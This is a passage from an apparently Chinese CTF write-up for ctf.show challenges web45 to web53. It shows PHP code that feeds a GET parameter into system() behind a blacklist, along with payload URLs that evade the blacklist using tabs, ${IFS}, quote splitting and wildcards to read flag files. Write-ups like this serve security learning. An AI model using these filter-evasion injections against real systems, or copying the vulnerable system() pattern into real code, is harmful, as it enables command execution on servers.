</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:35:34
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| /i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在之前的过滤基础上，把空格过滤了，所以可以采用“tab”但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录</p>
<p>所以采用tab的url编码<code>%09</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://36a28485-8f30-45c2-8609-9961e849c7d9.challenge.ctf.show/?c=tac%09fla*||
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web46" class="headerLink">
    <a href="#web46" class="header-mark"></a>[web46]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:50:19
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://fbf393b9-61e3-424c-a868-ed9427f3231e.challenge.ctf.show/?c=tac%09fla%27%27g.php||
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web47" class="headerLink">
    <a href="#web47" class="header-mark"></a>[web47]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:59:23
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这次又多过滤了more，less，head，sort，tail</p>
<blockquote>
<p>more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</p>
</blockquote>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://25de6835-dd96-4a50-83af-50fa48cfa1f4.challenge.ctf.show/?c=tac%09fla?.php||
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web48" class="headerLink">
    <a href="#web48" class="header-mark"></a>[web48]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:06:20
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://fcd9b6a0-166f-483d-b987-2691fda042b2.challenge.ctf.show/?c=tac%09fla?.php||
</span></span></code></pre></td></tr></table>
</div>
</div><p>[web49]跟48差不多</p>
<h3 id="web50" class="headerLink">
    <a href="#web50" class="header-mark"></a>[web50]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:32:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://14f16d04-b94e-4a71-81d9-0b3a691de2a9.challenge.ctf.show/?c=tac&lt;fl&#39;&#39;ag.php||
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web51" class="headerLink">
    <a href="#web51" class="header-mark"></a>[web51]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:42:52
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>又过滤了tac等，可以使用<code>ta‘’c</code></p>
<p>payload：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://efdac68a-4d21-4a65-b7bf-cbc9f8f0f7b9.challenge.ctf.show?c=ta&#39;&#39;c&lt;fla&#39;&#39;g.php||
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web52" class="headerLink">
    <a href="#web52" class="header-mark"></a>[web52]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:50:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ls${IFS}/||
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png" title="image-20230705222110720" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222110720.png 2x"
            sizes="auto"
            alt="image-20230705222110720">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ta&#39;&#39;c${IFS}/fla&#39;&#39;g||
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png" title="image-20230705222154582" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230705222154582.png 2x"
            sizes="auto"
            alt="image-20230705222154582">
    </a></figure></p>
<h3 id="web53" class="headerLink">
    <a href="#web53" class="header-mark"></a>[web53]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 18:21:02
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
